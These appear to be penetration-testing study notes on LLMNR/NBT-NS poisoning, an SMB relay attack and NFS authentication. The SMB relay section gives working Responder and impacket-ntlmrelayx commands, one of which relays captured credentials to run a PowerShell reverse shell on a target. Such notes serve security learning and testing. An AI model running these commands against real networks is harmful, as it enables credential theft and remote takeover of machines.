### LLMNR/NBT-NS Poisoning
- for more info check [this](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Active%20Directory%20Enumeration%20%26%20Attacks#llmnrnbt-ns-poisoning)
- if we are in the same network we can pretend to be a smb server and catch the user hashes 
```
1) The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
2) If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
3) Is there no local DNS record? A query will be sent to the DNS server that has been configured.
4) If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
```
- user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\` In that case, the machine will send a multicast query to all devices on the network

```
 responder -I <interface name>
```

### SMB relay attack
The target must not enforce or enable SMB signing.


- run responder
```
 responder -I <interface name>
```
- will capture credintials and pass it using techniques like `PtH` to another systems 
- [revshells](https://www.revshells.com/)
```shell
#  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
cat /etc/responder/Responder.conf | grep 'SMB ='

# -t is the taregt we rely this to
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <poweshell base64 reverse shell>'

# NFS
- Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. 
- NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers.

## Service info

| Version | Features                                                                                                                                             |
|---------|-----------------------------------------------------------------------------------------------------------------------------------------------------|
| NFSv2   | It is older but is supported by many systems and was initially operated entirely over UDP.                                                          |
| NFSv3   | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.                      |
| NFSv4   | It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol. |


### port used  
- Port 2049 TCP or UDP: NFS 
- Port 111 TCP or UDP : for SUN Remote Procedure Call (RPC Portmapper) which is used as portmapper and **nfs rely on it for auth**

### Auth in NFC 
- NFS itself has no built-in authentication or authorization mechanisms, Authentication is delegated to the RPC protocol's options.
#### Default NFS Authentication: UNIX UID/GID via RPC
- The server, using RPC, translates the client's UID/GID into its local file system's format to enforce access permissions based on file system rules.
#### NFS Authentication: Kerberos via RPC
- RPCSEC_GSS in NFSv4 enables Kerberos authentication, allowing the client and server to mutually authenticate each other before any file access is granted.
